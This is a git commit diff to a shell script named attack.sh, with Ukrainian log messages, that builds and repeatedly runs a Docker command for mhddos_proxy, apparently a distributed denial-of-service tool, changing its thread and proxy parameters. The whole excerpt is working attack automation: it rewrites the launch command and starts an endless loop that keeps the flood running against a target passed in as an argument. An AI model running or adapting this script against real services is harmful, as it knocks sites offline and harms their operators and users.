e146800ee6242eb746124bb1448b1f7117acfc3a
va1d3mar <Valdemarius666@protonmail.com>
2022-04-13 10:10:55 +0300

    Update attack.sh

--- attack.sh
+++ attack.sh
@@ -17,7 +17,7 @@ echo "$(date "+%d.%m.%Y %H:%M:%S")" "Наданий параметр:" "$2" >> $
 echo "$(date "+%d.%m.%Y %H:%M:%S")" "Виконую переналаштування для автоматизації виконання" >> $logfile
 command=${command#"docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "}
 command=${command%" -t 1000 -p 1200 --rpc 1000 --debug"}
-command="docker run -i --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "$command" -t "$2" -p 1200 --rpc 1000 --table"
+command="docker run -i --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "$command" -t "$2" -p 900 --rpc 1000 --table"
 echo "$(date "+%d.%m.%Y %H:%M:%S")" "Остаточна команда: " "$command" >> $logfile
 while true 
 do
